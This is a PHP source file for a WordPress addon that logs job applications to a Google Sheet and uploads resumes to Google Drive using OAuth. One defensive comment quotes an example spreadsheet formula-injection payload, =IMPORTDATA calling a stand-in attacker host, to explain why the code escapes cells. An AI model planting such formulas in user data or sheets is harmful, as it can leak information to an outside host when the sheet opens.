<?php
/**
 * Addon Name: Job Application Sync
 * Description: Logs every job application to a Google Sheet and saves each resume to Google Drive, using your own Google account via "Connect with Google" (OAuth) — no JSON key files.
 * Version: 3.0.2
 * Author: Amanullah Khan
 * Requires CMM4 at least: 6.10.0
 *
 * CMM4 Addon: Job Application Sync (Google Sheets & Drive)
 *
 * Purpose-built for job application forms specifically — NOT a generic
 * "sync any form" tool. It is scoped to one or more nominated Job
 * Application form IDs, and its logic (resume field, applicant-name
 * detection, filename convention) assumes that shape of data. This keeps
 * the core cmm4 plugin fully generic and untouched: it doesn't know or
 * care that this addon exists, the same as any other addon in /addons/.
 *
 * On every submission to a nominated job application form, this addon:
 *   1. Uploads the resume into a Google Drive folder in YOUR connected
 *      Google account.
 *   2. Appends one row to a Google Sheet (also in your account) with the
 *      applicant's fields, plus a clickable HYPERLINK() to the resume — the
 *      same link-in-a-cell pattern the core plugin already uses for CSV.
 *
 * AUTHENTICATION — "Connect with Google" (OAuth 2.0)
 *   Click Connect, sign in with your own Google account, and approve
 *   access. No JSON key files, no service-account email to share things
 *   with — the Sheet and Drive folder just need to already exist in the
 *   Google account you connect with. The plugin stores a refresh token
 *   (server-side, never shown in the browser) and uses it to silently
 *   fetch new short-lived access tokens as needed, so you only approve
 *   once. If access is ever revoked (from your Google Account's
 *   "Third-party access" settings, or by clicking Disconnect here), just
 *   click Connect again.
 *
 * No external libraries are required — this talks to Google's REST APIs
 * directly using WordPress's own HTTP functions, matching this plugin's
 * existing "lightweight, sandboxed" design.
 *
 * SETUP (one-time):
 *   1. In Google Cloud Console (console.cloud.google.com), create a
 *      project, then enable the "Google Sheets API" and "Google Drive API"
 *      for it (APIs & Services → Library).
 *   2. Go to APIs & Services → Credentials → Create Credentials → OAuth
 *      client ID. Application type: "Web application".
 *   3. Under "Authorized redirect URIs", add the exact URL shown on this
 *      addon's settings page (CMM Forms → Job Application Sync) — it looks
 *      like https://yoursite.com/wp-admin/admin.php?page=cmm4-job-app-sync
 *   4. Copy the Client ID and Client Secret Google gives you and paste them
 *      into the fields on this addon's settings page. Save.
 *   5. Click "Connect with Google" and approve access with the Google
 *      account that owns your target Sheet and Drive folder.
 *   6. Fill in the Spreadsheet ID (from the sheet's URL, the long string
 *      between /d/ and /edit), the Drive Folder ID (from the folder's URL,
 *      after /folders/), and the Job Application Form ID(s) this addon
 *      should watch.
 *   7. Tick "Enable Sync" and save, then use "Send Test Row" to confirm it
 *      all works before relying on it for real applications. The test also
 *      checks that the Drive folder is reachable, not just the Sheet.
 *
 * NOTE ON GOOGLE'S "UNVERIFIED APP" SCREEN: until you submit this OAuth
 * app for Google's verification review (only needed if other people
 * besides you will click Connect), Google shows a "Google hasn't verified
 * this app" warning on the consent screen. This is normal for an app only
 * you use — click "Advanced" → "Go to (your app name) (unsafe)" to proceed.
 * It does not affect how the addon works.
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

// ==========================================
// SETTINGS PAGE — registered under the core CMM Forms menu
// ==========================================
add_action( 'cmm4_admin_menu_after', 'cmm4_jas_register_menu' );
function cmm4_jas_register_menu() {
    add_submenu_page( 'cmm4-dashboard', 'Job Application Sync', 'Job Application Sync', 'manage_options', 'cmm4-job-app-sync', 'cmm4_jas_settings_page' );
}

// The exact URL Google redirects back to after the user approves access —
// must be pasted into Google Cloud Console's "Authorized redirect URIs"
// verbatim. Reuses this same settings page rather than a separate route.
function cmm4_jas_redirect_uri() {
    return admin_url( 'admin.php?page=cmm4-job-app-sync' );
}

function cmm4_jas_settings_page() {
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( 'You do not have permission to access this page.' );
    }

    $notice = '';

    // ---- OAuth callback: Google redirects back here with ?code=... ----
    if ( isset( $_GET['code'] ) && isset( $_GET['state'] ) ) {
        if ( ! wp_verify_nonce( sanitize_text_field( wp_unslash( $_GET['state'] ) ), 'cmm4_jas_oauth_state' ) ) {
            $notice = '<div class="error"><p>That connection link expired or is invalid — click "Connect with Google" again.</p></div>';
        } else {
            $result = cmm4_jas_handle_oauth_callback( sanitize_text_field( wp_unslash( $_GET['code'] ) ) );
            if ( is_wp_error( $result ) ) {
                $notice = '<div class="error"><p>Google connection failed: ' . esc_html( $result->get_error_message() ) . '</p></div>';
            } else {
                $notice = '<div class="updated"><p>Connected to Google as <strong>' . esc_html( $result ) . '</strong>.</p></div>';
            }
        }
        // Scrub ?code/?state from the address bar so refreshing the page
        // doesn't try to reuse an already-spent authorization code.
        echo '<script>window.history.replaceState(null, "", "' . esc_url_raw( admin_url( 'admin.php?page=cmm4-job-app-sync' ) ) . '");</script>';
    } elseif ( isset( $_GET['cmm4_jas_error'] ) ) {
        $notice = '<div class="error"><p>Google sign-in was cancelled or failed, so nothing was connected.</p></div>';
    }

    if ( isset( $_POST['cmm4_jas_save'] ) && check_admin_referer( 'cmm4_jas_action', 'cmm4_jas_nonce' ) ) {
        // Step 1 and Step 3 below are separate <form> elements (so each can
        // be saved on its own), which means a save from one form's fields
        // are simply absent from that POST — not intentionally cleared.
        // Every field here is only written when it's actually present in
        // this particular submission, so saving Step 1 never blanks out
        // Step 3's settings, and vice versa.
        if ( isset( $_POST['cmm4_jas_client_id'] ) ) {
            update_option( 'cmm4_jas_client_id', sanitize_text_field( wp_unslash( $_POST['cmm4_jas_client_id'] ) ) );
        }

        // Client Secret: leave the stored value alone if the field is left
        // blank on save (same "blank = keep existing" convention the old
        // JSON-paste field used), so re-saving Step 1 doesn't force
        // re-entering the secret every time.
        if ( isset( $_POST['cmm4_jas_client_secret'] ) ) {
            $posted_secret = trim( wp_unslash( $_POST['cmm4_jas_client_secret'] ) );
            if ( $posted_secret !== '' ) {
                update_option( 'cmm4_jas_client_secret', $posted_secret );
            }
        }

        if ( isset( $_POST['cmm4_jas_spreadsheet_id'] ) ) {
            update_option( 'cmm4_jas_spreadsheet_id', sanitize_text_field( wp_unslash( $_POST['cmm4_jas_spreadsheet_id'] ) ) );
        }
        if ( isset( $_POST['cmm4_jas_sheet_name'] ) ) {
            $sheet_name_posted = trim( wp_unslash( $_POST['cmm4_jas_sheet_name'] ) );
            update_option( 'cmm4_jas_sheet_name', $sheet_name_posted !== '' ? sanitize_text_field( $sheet_name_posted ) : 'Sheet1' );
        }
        if ( isset( $_POST['cmm4_jas_drive_folder_id'] ) ) {
            update_option( 'cmm4_jas_drive_folder_id', sanitize_text_field( wp_unslash( $_POST['cmm4_jas_drive_folder_id'] ) ) );
        }
        if ( isset( $_POST['cmm4_jas_form_ids'] ) ) {
            update_option( 'cmm4_jas_form_ids', sanitize_text_field( wp_unslash( $_POST['cmm4_jas_form_ids'] ) ) );
        }
        // "Enable Sync" only lives on Step 3's form, so its absence in
        // $_POST only means "unchecked" when this save actually came from
        // Step 3 (signaled by the hidden cmm4_jas_step3 marker on that
        // form) — otherwise (e.g. saving Step 1) leave the stored value
        // exactly as it was.
        if ( isset( $_POST['cmm4_jas_step3'] ) ) {
            update_option( 'cmm4_jas_enabled', isset( $_POST['cmm4_jas_enabled'] ) ? 'yes' : 'no' );
        }

        // Any credential/config change invalidates a cached token from the old setup.
        delete_transient( 'cmm4_jas_access_token' );

        if ( $notice === '' ) {
            $notice = '<div class="updated"><p>Job Application Sync settings saved.</p></div>';

            // Safety net: syncing with no Form ID silently means "every cmm4
            // form on the site", which is easy to enable by accident. Make
            // that explicit instead of letting it be a surprise later.
            if ( get_option( 'cmm4_jas_enabled' ) === 'yes' && trim( (string) get_option( 'cmm4_jas_form_ids', '' ) ) === '' ) {
                $notice .= '<div class="error" style="border-left-color:#dba617;"><p>Heads up: no Job Application Form ID is set, so this addon will sync <strong>every</strong> cmm4 form submission on the site — not just job applications. Fill in the Form ID field above if that\'s not what you want.</p></div>';
            }
        }
    } elseif ( isset( $_POST['cmm4_jas_test'] ) && check_admin_referer( 'cmm4_jas_action', 'cmm4_jas_nonce' ) ) {
        $result = cmm4_jas_test_connection();
        if ( is_wp_error( $result ) ) {
            $notice = '<div class="error"><p>Test failed: ' . esc_html( $result->get_error_message() ) . '</p></div>';
        } else {
            $notice = '<div class="updated"><p>Connection looks good — Drive folder is reachable and a test row was sent to your Google Sheet (feel free to delete it).</p></div>';
        }
    } elseif ( isset( $_POST['cmm4_jas_disconnect'] ) && check_admin_referer( 'cmm4_jas_action', 'cmm4_jas_nonce' ) ) {
        delete_option( 'cmm4_jas_refresh_token' );
        delete_option( 'cmm4_jas_connected_email' );
        delete_transient( 'cmm4_jas_access_token' );
        $notice = '<div class="updated"><p>Disconnected from Google. Click "Connect with Google" below to reconnect.</p></div>';
    }

    $client_id       = get_option( 'cmm4_jas_client_id', '' );
    $client_secret   = get_option( 'cmm4_jas_client_secret', '' );
    $refresh_token   = get_option( 'cmm4_jas_refresh_token', '' );
    $connected_email = get_option( 'cmm4_jas_connected_email', '' );
    $spreadsheet_id  = get_option( 'cmm4_jas_spreadsheet_id', '' );
    $sheet_name      = get_option( 'cmm4_jas_sheet_name', 'Sheet1' );
    $folder_id       = get_option( 'cmm4_jas_drive_folder_id', '' );
    $form_ids        = get_option( 'cmm4_jas_form_ids', '' );
    $enabled         = get_option( 'cmm4_jas_enabled', 'no' );
    $redirect_uri    = cmm4_jas_redirect_uri();
    $is_connected    = ( $refresh_token !== '' );
    ?>
    <div class="cmm4-admin-wrap">
        <h1 class="cmm4-title">Job Application Sync</h1>
        <p class="cmm4-subtitle">Automatically log every job application to a Google Sheet and save each resume to Google Drive. Scoped to the form ID(s) below — other cmm4 forms on the site are never touched.</p>

        <?php echo $notice; ?>

        <div class="cmm4-card" style="margin-bottom:20px;">
            <h2 style="font-size:15px; margin:0 0 14px 0;">Step 1 — Google Cloud credentials</h2>
            <form method="post" action="">
                <?php wp_nonce_field( 'cmm4_jas_action', 'cmm4_jas_nonce' ); ?>
                <table class="cmm4-table">
                    <tr>
                        <th style="width:25%;">Authorized redirect URI</th>
                        <td>
                            <input type="text" readonly value="<?php echo esc_attr( $redirect_uri ); ?>" class="cmm4-input-text" style="font-family:monospace; font-size:12px; background:#f4f4f4;" onclick="this.select();" />
                            <p style="margin:6px 0 0 0; font-size:12px; color:#999;">Paste this exact URL into Google Cloud Console → APIs &amp; Services → Credentials → your OAuth client → "Authorized redirect URIs".</p>
                        </td>
                    </tr>
                    <tr>
                        <th>Client ID</th>
                        <td><input type="text" name="cmm4_jas_client_id" value="<?php echo esc_attr( $client_id ); ?>" class="cmm4-input-text" placeholder="xxxxxxxxxxxx.apps.googleusercontent.com" /></td>
                    </tr>
                    <tr>
                        <th>Client Secret</th>
                        <td>
                            <input type="password" name="cmm4_jas_client_secret" value="" class="cmm4-input-text" placeholder="<?php echo $client_secret !== '' ? 'Saved — leave blank to keep it' : 'Paste your Client Secret'; ?>" autocomplete="off" />
                            <p style="margin:6px 0 0 0; font-size:12px; color:#999;">Leave blank on save to keep the currently stored secret.</p>
                        </td>
                    </tr>
                </table>
                <input type="submit" name="cmm4_jas_save" class="cmm4-btn-black" value="Save Settings" />
            </form>
        </div>

        <div class="cmm4-card" style="margin-bottom:20px;">
            <h2 style="font-size:15px; margin:0 0 14px 0;">Step 2 — Connect your Google account</h2>
            <?php if ( $is_connected ) : ?>
                <p style="margin:0 0 14px 0; font-size:13px; color:#2a7d2a;">✓ Connected<?php echo $connected_email ? ' as <strong>' . esc_html( $connected_email ) . '</strong>' : ''; ?>. Your target Sheet and Drive folder just need to exist in this Google account.</p>
                <form method="post" action="" style="display:inline;">
                    <?php wp_nonce_field( 'cmm4_jas_action', 'cmm4_jas_nonce' ); ?>
                    <button type="submit" name="cmm4_jas_disconnect" class="cmm4-btn-black" style="background:#b5625f;" onclick="return confirm('Disconnect this Google account? Syncing will stop until you reconnect.');">Disconnect</button>
                </form>
            <?php elseif ( empty( $client_id ) || empty( $client_secret ) ) : ?>
                <p style="margin:0; font-size:13px; color:#999;">Save a Client ID and Client Secret above first, then come back here to connect.</p>
            <?php else : ?>
                <p style="margin:0 0 14px 0; font-size:13px; color:#666;">Not connected yet.</p>
                <a href="<?php echo esc_url( cmm4_jas_get_auth_url() ); ?>" class="cmm4-btn-black" style="text-decoration:none; display:inline-block;">Connect with Google</a>
                <p style="margin:10px 0 0 0; font-size:12px; color:#999;">You'll see a Google sign-in screen, and possibly a "Google hasn't verified this app" warning first — that's expected for an app only you use; choose Advanced → Go to (app name) to continue.</p>
            <?php endif; ?>
        </div>

        <div class="cmm4-card">
            <h2 style="font-size:15px; margin:0 0 14px 0;">Step 3 — Sheet, folder, and forms</h2>
            <form method="post" action="">
                <?php wp_nonce_field( 'cmm4_jas_action', 'cmm4_jas_nonce' ); ?>
                <input type="hidden" name="cmm4_jas_step3" value="1" />
                <table class="cmm4-table">
                    <tr>
                        <th style="width:25%;">Enable Sync</th>
                        <td><label><input type="checkbox" name="cmm4_jas_enabled" value="yes" <?php checked( $enabled, 'yes' ); ?> /> Send every submission to Google automatically</label></td>
                    </tr>
                    <tr><th>Spreadsheet ID</th><td><input type="text" name="cmm4_jas_spreadsheet_id" value="<?php echo esc_attr( $spreadsheet_id ); ?>" class="cmm4-input-text" placeholder="From the sheet's URL, between /d/ and /edit" /></td></tr>
                    <tr><th>Sheet / Tab Name</th><td><input type="text" name="cmm4_jas_sheet_name" value="<?php echo esc_attr( $sheet_name ); ?>" class="cmm4-input-text" placeholder="Sheet1" /></td></tr>
                    <tr><th>Drive Folder ID</th><td><input type="text" name="cmm4_jas_drive_folder_id" value="<?php echo esc_attr( $folder_id ); ?>" class="cmm4-input-text" placeholder="From the folder's URL, after /folders/" /></td></tr>
                    <tr><th>Job Application Form ID(s)</th><td><input type="text" name="cmm4_jas_form_ids" value="<?php echo esc_attr( $form_ids ); ?>" class="cmm4-input-text" placeholder="e.g. 14 or 14, 27 for multiple job listings" /><p style="margin:6px 0 0 0; font-size:12px; color:#999;">Required — this addon only acts on these form IDs. Find a form's ID in its edit-page URL. Leave blank only if you intend every cmm4 form on the site to sync here.</p></td></tr>
                </table>
                <input type="submit" name="cmm4_jas_save" class="cmm4-btn-black" value="Save Settings" />
                <input type="submit" name="cmm4_jas_test" class="cmm4-btn-black" style="background:#555; margin-left:10px;" value="Send Test Row" />
                <p style="margin:10px 0 0 0; font-size:12px; color:#999;">Save your settings first — the test button uses whatever is currently saved.</p>
            </form>
        </div>
    </div>
    <?php
}

// ==========================================
// FIRES RIGHT AFTER THE CORE PLUGIN LOGS A SUBMISSION
// ==========================================
add_action( 'cmm4_after_submission_saved', 'cmm4_jas_sync_submission', 10, 3 );
function cmm4_jas_sync_submission( $form_id, $clean_data, $submission_id ) {
    if ( get_option( 'cmm4_jas_enabled' ) !== 'yes' ) {
        return;
    }

    $allowed_ids = trim( get_option( 'cmm4_jas_form_ids', '' ) );
    if ( $allowed_ids !== '' ) {
        $ids = array_map( 'trim', explode( ',', $allowed_ids ) );
        if ( ! in_array( (string) $form_id, $ids, true ) ) {
            return; // this form isn't in the allow-list — skip silently
        }
    }

    $access_token = cmm4_jas_get_access_token();
    if ( is_wp_error( $access_token ) ) {
        cmm4_jas_log( 'Auth failed: ' . $access_token->get_error_message() );
        return;
    }

    // Find the first file field (a job application form typically has one
    // resume upload) and push it to Drive.
    $resume_link  = '';
    $resume_label = '';
    foreach ( $clean_data as $val ) {
        if ( cmm4_is_file_value( $val ) ) {
            $uploaded = cmm4_jas_upload_resume_to_drive( $access_token, $val, $clean_data, $form_id );
            if ( is_wp_error( $uploaded ) ) {
                cmm4_jas_log( 'Drive upload failed: ' . $uploaded->get_error_message() );
            } else {
                $resume_link  = $uploaded['link'];
                $resume_label = $uploaded['name'];
            }
            break;
        }
    }

    $row = cmm4_jas_build_row( $clean_data, $resume_link, $resume_label, $form_id );

    $append_result = cmm4_jas_append_row( $access_token, $row );
    if ( is_wp_error( $append_result ) ) {
        cmm4_jas_log( 'Sheet append failed: ' . $append_result->get_error_message() );
    }
}

// ==========================================
// GOOGLE AUTH — OAuth 2.0 "Connect with Google" (Client ID + Secret + refresh token)
// ==========================================

// The scopes this addon needs: full Drive (not drive.file) because the
// target folder is created by the user and this addon needs to see and
// write into an existing folder, not just files it created itself; plus
// Sheets read/write; plus a minimal profile scope so the connected
// account's email can be shown on the settings page for confirmation.
function cmm4_jas_oauth_scopes() {
    return 'https://www.googleapis.com/auth/drive https://www.googleapis.com/auth/spreadsheets https://www.googleapis.com/auth/userinfo.email';
}

// Builds the URL the "Connect with Google" button links to.
function cmm4_jas_get_auth_url() {
    $client_id = get_option( 'cmm4_jas_client_id', '' );
    $params = array(
        'client_id'              => $client_id,
        'redirect_uri'           => cmm4_jas_redirect_uri(),
        'response_type'          => 'code',
        'scope'                  => cmm4_jas_oauth_scopes(),
        // offline + consent together guarantee Google actually returns a
        // refresh_token — without 'consent', a user who has connected
        // before (even to a different Client ID under the same project)
        // may get silently re-approved with no refresh_token in the reply.
        'access_type'            => 'offline',
        'prompt'                 => 'consent',
        'include_granted_scopes' => 'true',
        'state'                  => wp_create_nonce( 'cmm4_jas_oauth_state' ),
    );
    return 'https://accounts.google.com/o/oauth2/v2/auth?' . http_build_query( $params );
}

// Exchanges the one-time authorization code Google sent back for a refresh
// token (stored) and an access token (used immediately to fetch the
// connected account's email for display). Returns the email on success.
function cmm4_jas_handle_oauth_callback( $code ) {
    $client_id     = get_option( 'cmm4_jas_client_id', '' );
    $client_secret = get_option( 'cmm4_jas_client_secret', '' );
    if ( empty( $client_id ) || empty( $client_secret ) ) {
        return new WP_Error( 'cmm4_jas_no_client_creds', 'Client ID/Secret are not saved — save them first, then try connecting again.' );
    }

    $response = wp_remote_post( 'https://oauth2.googleapis.com/token', array(
        'timeout' => 20,
        'body'    => array(
            'code'          => $code,
            'client_id'     => $client_id,
            'client_secret' => $client_secret,
            'redirect_uri'  => cmm4_jas_redirect_uri(),
            'grant_type'    => 'authorization_code',
        ),
    ) );

    if ( is_wp_error( $response ) ) {
        return $response;
    }

    $body = json_decode( wp_remote_retrieve_body( $response ), true );
    $code_status = wp_remote_retrieve_response_code( $response );

    if ( $code_status !== 200 || empty( $body['access_token'] ) ) {
        $msg = isset( $body['error_description'] ) ? $body['error_description'] : 'Google rejected the authorization code.';
        return new WP_Error( 'cmm4_jas_oauth_exchange_failed', $msg );
    }

    if ( empty( $body['refresh_token'] ) ) {
        // Happens if the user had already granted access before without
        // 'prompt=consent' taking effect (rare, but possible if scopes
        // exactly matched a prior grant). Ask them to revoke access from
        // their Google Account's Security page and reconnect, which forces
        // a fresh consent screen and a new refresh_token.
        return new WP_Error( 'cmm4_jas_no_refresh_token', 'Google did not return a long-term connection. If you\'ve connected this app before, remove it from your Google Account\'s "Third-party access" settings and click Connect again.' );
    }

    update_option( 'cmm4_jas_refresh_token', $body['refresh_token'] );

    $access_token = $body['access_token'];
    $expires_in   = isset( $body['expires_in'] ) ? intval( $body['expires_in'] ) : 3600;
    set_transient( 'cmm4_jas_access_token', $access_token, max( 60, $expires_in - 120 ) );

    // Fetch the connected account's email, purely for display on the
    // settings page so the admin can confirm which account got connected.
    $email = '';
    $userinfo_response = wp_remote_get( 'https://www.googleapis.com/oauth2/v2/userinfo', array(
        'timeout' => 15,
        'headers' => array( 'Authorization' => 'Bearer ' . $access_token ),
    ) );
    if ( ! is_wp_error( $userinfo_response ) ) {
        $userinfo = json_decode( wp_remote_retrieve_body( $userinfo_response ), true );
        if ( ! empty( $userinfo['email'] ) ) {
            $email = $userinfo['email'];
            update_option( 'cmm4_jas_connected_email', $email );
        }
    }

    return $email !== '' ? $email : 'your Google account';
}

// Returns a valid short-lived access token, refreshing it from the stored
// refresh token as needed. This is the single choke point every Drive/
// Sheets call below goes through — it doesn't matter to them how the token
// was obtained, only that it's a valid bearer token.
function cmm4_jas_get_access_token() {
    $cached = get_transient( 'cmm4_jas_access_token' );
    if ( $cached ) {
        return $cached;
    }

    $client_id     = get_option( 'cmm4_jas_client_id', '' );
    $client_secret = get_option( 'cmm4_jas_client_secret', '' );
    $refresh_token = get_option( 'cmm4_jas_refresh_token', '' );

    if ( empty( $client_id ) || empty( $client_secret ) ) {
        return new WP_Error( 'cmm4_jas_no_client_creds', 'Google Client ID/Secret are not configured yet.' );
    }
    if ( empty( $refresh_token ) ) {
        return new WP_Error( 'cmm4_jas_not_connected', 'Not connected to Google yet — click "Connect with Google" on the Job Application Sync settings page.' );
    }

    $response = wp_remote_post( 'https://oauth2.googleapis.com/token', array(
        'timeout' => 20,
        'body'    => array(
            'client_id'     => $client_id,
            'client_secret' => $client_secret,
            'refresh_token' => $refresh_token,
            'grant_type'    => 'refresh_token',
        ),
    ) );

    if ( is_wp_error( $response ) ) {
        return $response;
    }

    $code = wp_remote_retrieve_response_code( $response );
    $body = json_decode( wp_remote_retrieve_body( $response ), true );

    if ( $code !== 200 || empty( $body['access_token'] ) ) {
        $msg = isset( $body['error_description'] ) ? $body['error_description'] : 'Google rejected the refresh request.';
        // A revoked/expired refresh token specifically needs reconnecting,
        // not just retrying — surface that distinction in the message.
        if ( isset( $body['error'] ) && $body['error'] === 'invalid_grant' ) {
            $msg = 'Google access has been revoked or expired. Click "Connect with Google" again on the Job Application Sync settings page.';
        }
        return new WP_Error( 'cmm4_jas_refresh_failed', $msg );
    }

    $expires_in = isset( $body['expires_in'] ) ? intval( $body['expires_in'] ) : 3600;
    // Cache the token, refreshing a couple of minutes early so it's never
    // used right at the edge of expiry.
    set_transient( 'cmm4_jas_access_token', $body['access_token'], max( 60, $expires_in - 120 ) );

    return $body['access_token'];
}

// ==========================================
// GOOGLE DRIVE — upload the resume into the shared folder
// ==========================================
function cmm4_jas_upload_resume_to_drive( $access_token, $file_val, $clean_data, $form_id ) {
    $folder_id = trim( get_option( 'cmm4_jas_drive_folder_id', '' ) );
    if ( empty( $folder_id ) ) {
        return new WP_Error( 'cmm4_jas_no_folder', 'No Google Drive folder ID configured.' );
    }

    $stored_path = trailingslashit( cmm4_get_private_upload_dir() ) . $file_val['stored_name'];
    if ( ! file_exists( $stored_path ) ) {
        return new WP_Error( 'cmm4_jas_file_missing', 'Resume file not found on server.' );
    }

    $file_contents = file_get_contents( $stored_path );
    if ( $file_contents === false ) {
        return new WP_Error( 'cmm4_jas_file_read_failed', 'Could not read the resume file.' );
    }

    $applicant_name = cmm4_jas_detect_applicant_name( $clean_data );

    $ext        = strtolower( pathinfo( $file_val['original_name'], PATHINFO_EXTENSION ) );
    $form_title = get_the_title( $form_id );
    $drive_name = sanitize_file_name( $applicant_name . ' - ' . $form_title . ' - ' . current_time( 'Y-m-d' ) ) . '.' . $ext;

    $mime_types = array(
        'pdf'  => 'application/pdf',
        'doc'  => 'application/msword',
        'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    );
    $mime_type = isset( $mime_types[ $ext ] ) ? $mime_types[ $ext ] : 'application/octet-stream';

    $metadata = array(
        'name'    => $drive_name,
        'parents' => array( $folder_id ),
    );

    $boundary = 'cmm4gss' . uniqid();
    $body  = "--{$boundary}\r\n";
    $body .= "Content-Type: application/json; charset=UTF-8\r\n\r\n";
    $body .= wp_json_encode( $metadata ) . "\r\n";
    $body .= "--{$boundary}\r\n";
    $body .= "Content-Type: {$mime_type}\r\n";
    $body .= "Content-Transfer-Encoding: base64\r\n\r\n";
    $body .= base64_encode( $file_contents ) . "\r\n";
    $body .= "--{$boundary}--";

    // supportsAllDrives=true is required for the upload to succeed when the
    // target folder lives on a Shared Drive (common for HR/company folders)
    // — without it, Google returns a 403 even though sharing looks correct.
    // It's harmless to include for an ordinary "My Drive" folder too.
    $response = wp_remote_post( 'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&fields=id,webViewLink&supportsAllDrives=true', array(
        'timeout' => 45,
        'headers' => array(
            'Authorization' => 'Bearer ' . $access_token,
            'Content-Type'  => 'multipart/related; boundary=' . $boundary,
        ),
        'body' => $body,
    ) );

    if ( is_wp_error( $response ) ) {
        return $response;
    }

    $code = wp_remote_retrieve_response_code( $response );
    $data = json_decode( wp_remote_retrieve_body( $response ), true );

    if ( $code !== 200 || empty( $data['id'] ) ) {
        $msg = isset( $data['error']['message'] ) ? $data['error']['message'] : 'Google Drive rejected the upload.';
        return new WP_Error( 'cmm4_jas_upload_failed', $msg );
    }

    $link = ! empty( $data['webViewLink'] ) ? $data['webViewLink'] : ( 'https://drive.google.com/file/d/' . $data['id'] . '/view' );

    return array( 'link' => $link, 'name' => $file_val['original_name'] );
}

// Looks for a "name" field to build a readable Drive filename, instead of the
// randomized token the core plugin uses on disk. Checks common exact field
// slugs first (most job-application forms use one of these), and only falls
// back to a loose "contains 'name'" match if none of them are present — this
// avoids picking an unrelated field like "company-name" or "reference-name"
// when it happens to appear before the applicant's own name field.
function cmm4_jas_detect_applicant_name( $clean_data ) {
    $preferred_keys = array( 'full-name', 'applicant-name', 'your-name', 'candidate-name', 'name' );
    foreach ( $preferred_keys as $preferred_key ) {
        if ( isset( $clean_data[ $preferred_key ] ) && ! is_array( $clean_data[ $preferred_key ] ) && $clean_data[ $preferred_key ] !== '' ) {
            return $clean_data[ $preferred_key ];
        }
    }

    foreach ( $clean_data as $key => $val ) {
        if ( ! is_array( $val ) && stripos( (string) $key, 'name' ) !== false && $val !== '' ) {
            return $val;
        }
    }

    return 'Applicant';
}

// ==========================================
// GOOGLE SHEETS — append one row per submission
// ==========================================
// The sheet is written with valueInputOption=USER_ENTERED, so Google Sheets
// evaluates any cell that starts with = + - @ as a formula. An applicant could
// enter something like =IMPORTDATA("https://attacker.example/...") and have it
// run when the sheet is opened. A leading apostrophe makes Sheets store the
// value as plain text. The resume link below is built on purpose and is not
// passed through this function.
function cmm4_jas_safe_cell( $value ) {
    $value = (string) $value;
    if ( $value !== '' && in_array( $value[0], array( '=', '+', '-', '@', "\t", "\r" ), true ) ) {
        return "'" . $value;
    }
    return $value;
}

function cmm4_jas_build_row( $clean_data, $resume_link, $resume_label, $form_id ) {
    $row = array( cmm4_jas_safe_cell( current_time( 'Y-m-d H:i' ) ), cmm4_jas_safe_cell( get_the_title( $form_id ) ) );

    foreach ( $clean_data as $val ) {
        if ( cmm4_is_file_value( $val ) ) {
            continue; // the resume gets its own column below, not a raw value here
        }
        $row[] = cmm4_jas_safe_cell( is_array( $val ) ? implode( ', ', $val ) : $val );
    }

    if ( $resume_link !== '' ) {
        $safe_label = str_replace( '"', '""', $resume_label );
        $row[]      = '=HYPERLINK("' . $resume_link . '","' . $safe_label . '")';
    } else {
        $row[] = '';
    }

    return $row;
}

function cmm4_jas_append_row( $access_token, $row ) {
    $spreadsheet_id = trim( get_option( 'cmm4_jas_spreadsheet_id', '' ) );
    $sheet_name     = trim( get_option( 'cmm4_jas_sheet_name', 'Sheet1' ) );
    if ( $sheet_name === '' ) {
        $sheet_name = 'Sheet1';
    }

    if ( empty( $spreadsheet_id ) ) {
        return new WP_Error( 'cmm4_jas_no_sheet', 'No Google Sheet ID configured.' );
    }

    $range = rawurlencode( $sheet_name ) . '!A1';
    $url   = 'https://sheets.googleapis.com/v4/spreadsheets/' . rawurlencode( $spreadsheet_id ) . '/values/' . $range . ':append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS';

    $response = wp_remote_post( $url, array(
        'timeout' => 20,
        'headers' => array(
            'Authorization' => 'Bearer ' . $access_token,
            'Content-Type'  => 'application/json',
        ),
        'body' => wp_json_encode( array( 'values' => array( $row ) ) ),
    ) );

    if ( is_wp_error( $response ) ) {
        return $response;
    }

    $code = wp_remote_retrieve_response_code( $response );
    if ( $code !== 200 ) {
        $data = json_decode( wp_remote_retrieve_body( $response ), true );
        $msg  = isset( $data['error']['message'] ) ? $data['error']['message'] : 'Google Sheets rejected the row.';
        return new WP_Error( 'cmm4_jas_append_failed', $msg );
    }

    return true;
}

// ==========================================
// TEST CONNECTION — used by the "Send Test Row" button
// ==========================================
// Checks auth, then Drive folder access, then a Sheets append — in that
// order, so the error message always points at the first real problem
// instead of a downstream symptom of it.
function cmm4_jas_test_connection() {
    $access_token = cmm4_jas_get_access_token();
    if ( is_wp_error( $access_token ) ) {
        return $access_token;
    }

    $folder_check = cmm4_jas_test_drive_folder_access( $access_token );
    if ( is_wp_error( $folder_check ) ) {
        return $folder_check;
    }

    $row = array( current_time( 'Y-m-d H:i' ), 'Connection Test', 'This row confirms Job Application Sync is working — feel free to delete it.' );
    return cmm4_jas_append_row( $access_token, $row );
}

// Confirms the configured Drive folder is actually reachable with the
// current credentials, without creating any test file in it. Catches a
// wrong Folder ID or a folder that wasn't actually shared with the service
// account before it costs a real candidate's resume.
function cmm4_jas_test_drive_folder_access( $access_token ) {
    $folder_id = trim( get_option( 'cmm4_jas_drive_folder_id', '' ) );
    if ( empty( $folder_id ) ) {
        return new WP_Error( 'cmm4_jas_no_folder', 'No Google Drive folder ID configured.' );
    }

    $url = 'https://www.googleapis.com/drive/v3/files/' . rawurlencode( $folder_id ) . '?fields=id,name,mimeType&supportsAllDrives=true';
    $response = wp_remote_get( $url, array(
        'timeout' => 15,
        'headers' => array( 'Authorization' => 'Bearer ' . $access_token ),
    ) );

    if ( is_wp_error( $response ) ) {
        return $response;
    }

    $code = wp_remote_retrieve_response_code( $response );
    $data = json_decode( wp_remote_retrieve_body( $response ), true );

    if ( $code !== 200 || empty( $data['id'] ) ) {
        $msg = isset( $data['error']['message'] ) ? $data['error']['message'] : 'Could not access the Drive folder — double-check the Folder ID and make sure it is shared with the service account email above (Editor access).';
        return new WP_Error( 'cmm4_jas_folder_access_failed', $msg );
    }

    return true;
}

// ==========================================
// LOGGING — quiet failures, visible only when WP_DEBUG is on
// ==========================================
function cmm4_jas_log( $message ) {
    if ( defined( 'WP_DEBUG' ) && WP_DEBUG ) {
        error_log( 'CMM4 Job Application Sync: ' . $message );
    }
}
